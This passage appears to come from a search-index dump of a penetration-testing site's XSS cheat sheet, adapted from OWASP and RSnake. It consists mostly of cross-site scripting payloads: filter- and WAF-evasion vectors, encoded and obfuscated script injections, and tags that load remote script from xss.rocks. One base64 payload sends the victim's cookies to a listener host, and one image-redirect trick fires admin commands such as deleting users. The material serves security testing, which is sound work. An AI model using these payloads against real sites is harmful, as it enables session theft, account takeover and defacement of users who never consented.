the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job: <!--[if gte IE 4]> <script> alert('XSS'); </script> <![endif]--> BASE Tag \u00b6 Works in IE and Netscape 8.1 in safe mode. You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like images/image.jpg rather than full paths. If the path includes a leading forward slash like /images/image.jpg you can remove one slash from this vector (as long as there are two to begin the comment this will work): < base href = \"javascript:alert('XSS');//\" /> OBJECT Tag \u00b6 If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS: < object type = \"text/x-scriptlet\" data = \"http://xss.rocks/scriptlet.html\" ></ object > EMBED SVG Which Contains XSS Vector \u00b6 This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one. < EMBED SRC = \"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type = \"image/svg+xml\" AllowScriptAccess = \"always\" ></ EMBED > Using ActionScript Inside Flash for Obfuscation \u00b6 a = 'get' ; b = 'URL(\"' ; c = 'javascript:' ; d = \"alert('XSS');\\\")\" ; eval ( a + b + c + d ); XML Data Island with CDATA Obfuscation \u00b6 This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo: <XML ID= \"xss\" ><I><B><IMG SRC= \"javas<!-- -->cript:alert('XSS')\" ></B></I></XML> <SPAN DATASRC= \"#xss\" DATAFLD= \"B\" DATAFORMATAS= \"HTML\" ></SPAN> Locally hosted XML with embedded JavaScript that is generated using an XML data island \u00b6 This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here: <XML SRC= \"xsstest.xml\" ID= I ></XML> <SPAN DATASRC= #I DATAFLD= C DATAFORMATAS= HTML ></SPAN> HTML+TIME in XML \u00b6 This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work: < html > < body > < ?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"> < ?import namespace=\"t\" implementation=\"#default#time2\"> < t:set attributeName = \"innerHTML\" to = \"XSS <script defer> alert('XSS'); </script> \" > </ body > </ html > Assuming you can only fit in a few characters and it filters against .js \u00b6 You can rename your JavaScript file to an image as an XSS vector: < script src = \"http://xss.rocks/xss.jpg\" ></ script > SSI (Server Side Includes) \u00b6 This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues: <!-- # exec cmd = \"/bin/echo '<SCR'\" --> <!-- # exec cmd = \"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\" --> PHP \u00b6 Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues: <? echo ( '<SCR)' ; echo ( 'IPT>alert(\"XSS\")</SCRIPT>' ); ?> IMG Embedded Commands \u00b6 This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors: < img src = \"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\" /> IMG Embedded Commands part II \u00b6 This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=\"httx://badguy.com/a.jpg\"> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this): Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser Cookie Manipulation \u00b6 Admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...): < meta http-equiv = \"Set-Cookie\" content = \"USERID=<SCRIPT>alert('XSS')</SCRIPT>\" /> UTF-7 Encoding \u00b6 If the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.: < head > < meta http-equiv = \"CONTENT-TYPE\" content = \"text/html; charset=UTF-7\" /></ head > +ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-` XSS Using HTML Quote Encapsulation \u00b6 This was tested in IE, your mileage may vary. For performing XSS on sites that allow <SCRIPT> but don't allow <SCRIPT SRC... by way of a regex filter /\\<script\\[^\\>\\]+src/i : < script a = \">\" src = \"httx://xss.rocks/xss.js\" ></ script > For performing XSS on sites that allow <SCRIPT> but don't allow \\<script src... by way of a regex filter /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i (this is an important one, because I've seen this regex in the wild): < script =\" > \" src=\" httx : //xss.rocks/xss.js\"> </ script > Another XSS to evade the same filter, /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i : < SCRIPT a = \">\" '' SRC = \"httx://xss.rocks/xss.js\" ></ SCRIPT > Yet another XSS to evade the same filter, /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i . I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow <SCRIPT> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags): < SCRIPT \" a = '>' \" SRC = \"httx://xss.rocks/xss.js\" ></ SCRIPT > And one last XSS attack to evade, /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i using grave accents (again, doesn't work in Firefox): < script a = \"`\" > ` SRC=\"httx://xss.rocks/xss.js\"> </ script > Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly: < script a = \">'>\" src = \"httx://xss.rocks/xss.js\" ></ script > This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content: < SCRIPT > document . write ( \"<SCRI\" );</ SCRIPT > PT SRC=\"httx://xss.rocks/xss.js\"> </ SCRIPT > URL String Evasion \u00b6 Assuming http://www.google.com/ is programmatically disallowed: IP Versus Hostname \u00b6 < a href = \"http://66.102.7.147/\" > XSS </ a > URL Encoding \u00b6 < a href = \"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\" > XSS </ a > DWORD Encoding \u00b6 Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details: < a href = \"http://1113982867/\" > XSS </ a > Hex Encoding \u00b6 The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required): < a href = \"http://0x42.0x0000066.0x7.0x93/\" > XSS </ a > Octal Encoding \u00b6 Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...: < a href = \"http://0102.0146.0007.00000223/\" > XSS </ a > Base64 Encoding \u00b6 < img onload = \"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\" /> Mixed Encoding \u00b6 Let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes: < a href = \"h tt p://6 6.000146.0x7.147/\" > XSS </ a > Protocol Resolution Bypass \u00b6 // translates to http:// which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\\\\\ . You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL. < a href = \"//www.google.com/\" > XSS </ a > Google \"feeling lucky\" part 1 \u00b6 Firefox uses Google's \"feeling lucky\" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's keyword: protocol. You can concatenate several keywords by using something like the following keyword:XSS+RSnake for instance. This no longer works within Firefox as of 2.0. < a href = \"//google\" > XSS </ a > Google \"feeling lucky\" part 2 \u00b6 This uses a very tiny trick that appears to work Firefox only, because of it's implementation of the \"feeling lucky\" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0: < a href = \"http://ha.ckers.org@google\" > XSS </ a > Google \"feeling lucky\" part 3 \u00b6 This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the \"feeling lucky\" function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case \"google\"): < a href = \"http://google:ha.ckers.org\" > XSS </ a > Removing CNAMEs \u00b6 When combined with the above URL, removing www. will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly): < a href = \"http://google.com/\" > XSS </ a > Extra dot for absolute DNS: < a href = \"http://www.google.com./\" > XSS </ a > JavaScript Link Location \u00b6 < a href = \"javascript:document.location='http://www.google.com/'\" > XSS </ a > Content Replace as Attack Vector \u00b6 Assuming http://www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&\\#x09;script: was converted into java script: , which renders in IE, Netscape 8.1+ in secure site mode and Opera): < a href = \"http://www.google.com/ogle.com/\" > XSS </ a > Assisting XSS with HTTP Parameter Pollution \u00b6 Assume a content sharing flow on a web site is implemented as below. There is a \"Content\" page which includes some content provided by users and this page also includes a link to \"Share\" page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the \"title\" parameter in the \"Content\" page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type's value is a constant and will always be integer, they didn't encode or validate the content_type in the \"Share\" page. Content Page Source Code \u00b6 `a href=\"/Share?content_type=1 & title= < %=Encode.forHtmlAttribute(untrusted content title)%>\">Share </ a > Share Page Source Code \u00b6 < script > var contentType = <%= Request . getParameter ( \"content_type\" ) %> ; var title = \"<%=Encode.forJavaScript(request.getParameter(\" title \"))%>\" ; ... //some user agreement and sending to server logic might be here ... </ script > Content Page Output \u00b6 In this case if attacker set untrusted content title as \u201cThis is a regular title&content_type=1;alert(1)\u201d the link in \"Content\" page would be this: < a href = \"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\" > Share </ a > Share Page Output \u00b6 And in share page output could be this: < script > var contentType = 1 ; alert ( 1 ); var title = \"This is a regular title\" ; \u2026 //some user agreement and sending to server logic might be here \u2026 </ script > As a result, in this example the main flaw is trusting the content_type in the \"Share\" page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS. Character Escape Sequences \u00b6 All the possible combinations of the character \"\\<\" in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above. < %3C &lt &lt; &LT &LT; &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C Methods to Bypass WAF \u2013 Cross-Site Scripting \u00b6 Stored XSS \u00b6 If an attacker managed to push XSS through the filter, WAF wouldn\u2019t be able to prevent the attack conduction. Reflected XSS in Javascript \u00b6 Example: <script> ... setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) ... </script> Exploitation: /?xss=500); alert(document.cookie);// DOM-based XSS \u00b6 Example: <script> ... eval($\\_GET\\[xss\\]); ... </script> Exploitation: /?xss=document.cookie XSS via request Redirection \u00b6 Vulnerable code: ... header('Location: '.$_GET['param']); ... As well as: .. header('Refresh: 0; URL='.$_GET['param']); ... This request will not pass through the WAF: /?param=<javascript:alert(document.cookie>) This request will pass through the WAF and an XSS attack will be conducted in certain browsers. /?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= WAF ByPass Strings for XSS \u00b6 <Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\"> <Video> <source onerror = \"javascript: alert (XSS)\"> <Input value = \"XSS\" type = text> <applet code=\"javascript:confirm(document.cookie);\"> <isindex x=\"javascript:\" onmouseover=\"alert(XSS)\"> \"></SCRIPT>\u201d>\u2019><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> \"><img src=\"x:x\" onerror=\"alert(XSS)\"> \"><iframe src=\"javascript:alert(XSS)\"> <object data=\"javascript:alert(XSS)\"> <isindex type=image src=1 onerror=alert(XSS)> <img src=x:alert(alt) onerror=eval(src) alt=0> <img src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img> <iframe/src=\"data:text/html,<svg onload=alert(1)>\"> <meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/> <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script <meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"> <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;> <form><a href=\"javascript:\\u0061lert(1)\">X </script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'> <style>//*{x:expression(alert(/xss/))}//<style></style> On Mouse Over\u200b <img src=\"/\" =_=\" title=\"onerror='prompt(1)'\"> <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe <script x> alert(1) </script 1=2 <form><button formaction=javascript&colon;alert(1)>CLICKME <input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\" <iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe> <OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT> Filter Bypass Alert Obfuscation \u00b6 (alert)(1) a=alert,a(1) [1].find(alert) top[\u201cal\u201d+\u201dert\u201d](1) top[/al/.source+/ert/.source](1) al\\u0065rt(1) top[\u2018al\\145rt\u2019](1) top[\u2018al\\x65rt\u2019](1) top[8680439..toString(30)](1) alert?.() ` ${alert``} ` (The payload should include leading and trailing backticks.) (alert()) source: OWASP / www-community", "title": "XSS CheatSheet"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xss-cheatsheet", "text": "", "title": "XSS CheatSheet"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#introduction", "text": "This article is focused on providing application security testing professionals with a guide to assist in Cross Site Scripting testing. The initial contents of this article were donated to OWASP by RSnake, from his seminal XSS CheatSheet, which was at: http://ha.ckers.org/xss.html . That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP Prevention CheatSheet, the Cross Site Scripting Prevention CheatSheet , was inspired by RSnake's XSS CheatSheet, so we can thank RSnake for our inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS, rather than simply telling developers to build apps that could protect against all the fancy tricks specified in rather complex attack CheatSheet, and so the OWASP CheatSheet Series was born. This CheatSheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defense for XSS which these tests can be used to illustrate.", "title": "Introduction"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#basic-xss-test-without-filter-evasion", "text": "This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here): < SCRIPT SRC = http://xss.rocks/xss.js ></ SCRIPT >", "title": "Basic XSS Test Without Filter Evasion"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xss-locator-polygot", "text": "The following is a \"polygot test XSS payload.\" This test will execute in multiple contexts including html, script string, js and url. Thank you to Gareth Heyes for this contribution . `javascript:/*--> </ title ></ style ></ textarea ></ script ></ xmp >< svg / onload = '+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//' >", "title": "XSS Locator (Polygot)"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#image-xss-using-the-javascript-directive", "text": "Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well: < img src = \"javascript:alert('XSS');\" />", "title": "Image XSS Using the JavaScript Directive"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#no-quotes-and-no-semicolon", "text": "< IMG SRC = javascript:alert('XSS') >", "title": "No Quotes and no Semicolon"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#case-insensitive-xss-attack-vector", "text": "< IMG SRC = JaVaScRiPt:alert('XSS') >", "title": "Case Insensitive XSS Attack Vector"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#html-entities", "text": "The semicolons are required for this to work: < img src = 'javascript:alert(\"XSS\")' />", "title": "HTML Entities"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#grave-accent-obfuscation", "text": "If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents: < IMG SRC = `javascript:alert(\"RSnake says , ' XSS '\")` >", "title": "Grave Accent Obfuscation"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#malformed-a-tags", "text": "Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross ~ Verified on Chrome `\\ < a onmouseover = \"alert(document.cookie)\" \\ > xxs link\\ < /a\\> or Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script. `\\ < a onmouseover = alert(document.cookie)\\ > xxs link\\ < /a\\>", "title": "Malformed A Tags"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#malformed-img-tags", "text": "Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tags: < IMG \"\"\" > < script > alert ( 'XSS' ); </ script > \"\\>", "title": "Malformed IMG Tags"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#fromcharcode", "text": "If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need: < img src = \"javascript:alert(String.fromCharCode(88,83,83))\" />", "title": "fromCharCode"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#default-src-tag-to-get-past-filters-that-check-src-domain", "text": "This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like onblur , onclick giving you an extensive amount of variations for many injections listed here. Submitted by David Cross . < img src = \"#\" onmouseover = \"alert('xxs')\" />", "title": "Default SRC Tag to Get Past Filters that Check SRC Domain"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#default-src-tag-by-leaving-it-empty", "text": "< img src = \"onmouseover\" =\" alert (' xxs ')\" />", "title": "Default SRC Tag by Leaving it Empty"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#default-src-tag-by-leaving-it-out-entirely", "text": "< img onmouseover = \"alert('xxs')\" />", "title": "Default SRC Tag by Leaving it out Entirely"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#on-error-alert", "text": "< IMG SRC = / onerror = \"alert(String.fromCharCode(88,83,83))\" ></ img >", "title": "On Error Alert"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-onerror-and-javascript-alert-encode", "text": "< img src = x onerror = \"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\" >", "title": "IMG onerror and JavaScript Alert Encode"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#decimal-html-character-references", "text": "All of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). < img src = \"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\" />", "title": "Decimal HTML Character References"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#decimal-html-character-references-without-trailing-semicolons", "text": "This is often effective in XSS that attempts to look for \"&#XX;\", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like \\(tmp_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/\\) 1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild): < img src = \"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\" />", "title": "Decimal HTML Character References Without Trailing Semicolons"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#hexadecimal-html-character-references-without-trailing-semicolons", "text": "This is also a viable XSS attack against the above string \\(tmp_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/\\) 1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters). < img src = \"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\" />", "title": "Hexadecimal HTML Character References Without Trailing Semicolons"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embedded-tab", "text": "Used to break up the cross site scripting attack: < img src = \"jav ascript:alert('XSS');\" />", "title": "Embedded Tab"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embedded-encoded-tab", "text": "Use this one to break up XSS : < img src = \"jav&#x09;ascript:alert('XSS');\" />", "title": "Embedded Encoded Tab"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embedded-newline-to-break-up-xss", "text": "Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector: < img src = \"jav&#x0A;ascript:alert('XSS');\" />", "title": "Embedded Newline to Break-up XSS"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embedded-carriage-return-to-break-up-xss", "text": "(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.): < img src = \"jav&#x0D;ascript:alert('XSS');\" />", "title": "Embedded Carriage Return to Break-up XSS"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#null-breaks-up-javascript-directive", "text": "Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use %00 in the URL string or if you want to write your own injection tool you can either use vim ( ^V^@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example: `perl -e 'print \" < IMG SRC = java\\0script:alert(\\\"XSS\\\") > \";' > out`", "title": "Null breaks up JavaScript Directive"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#spaces-and-meta-chars-before-the-javascript-in-images-for-xss", "text": "This is useful if the pattern match doesn't take into account spaces in the word javascript: -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the javascript: keyword. The actual reality is you can have any char from 1-32 in decimal: < img src = \" &#14; javascript:alert('XSS');\" />", "title": "Spaces and Meta Chars Before the JavaScript in Images for XSS"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#non-alpha-non-digit-xss", "text": "The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example \\<SCRIPT\\\\s != \\<SCRIPT/XSS\\\\s : < SCRIPT / XSS SRC = \"http://xss.rocks/xss.js\" ></ SCRIPT > Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here: < BODY onload !#$%&()*~+ -_ ., : ;?@[/|\\]^`= alert (\" XSS \") > Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces. < SCRIPT / SRC = \"http://xss.rocks/xss.js\" ></ SCRIPT >", "title": "Non-alpha-non-digit XSS"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#extraneous-open-brackets", "text": "Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error: < < script > alert ( 'XSS' ); //\\< </ script >", "title": "Extraneous Open Brackets"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#no-closing-script-tags", "text": "In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the \\></SCRIPT> portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected: < SCRIPT SRC = http://xss.rocks/xss.js?< B >", "title": "No Closing Script Tags"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#protocol-resolution-in-script-tags", "text": "This particular variant was submitted by \u0141ukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The \".j\" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag. < SCRIPT SRC = //xss.rocks/.j >", "title": "Protocol Resolution in Script Tags"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#half-open-htmljavascript-xss-vector", "text": "Unlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close \">\" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/ because it doesn't require the end \">\". As a side note, this was also affective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag: < IMG SRC = \"`<javascript:alert>`('XSS')\" `", "title": "Half Open HTML/JavaScript XSS Vector"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#double-open-angle-brackets", "text": "Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't: < iframe src = http://xss.rocks/scriptlet.html <`", "title": "Double Open Angle Brackets"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#escaping-javascript-escapes", "text": "When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a=\"$ENV{QUERY\\_STRING}\";</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <SCRIPT>var 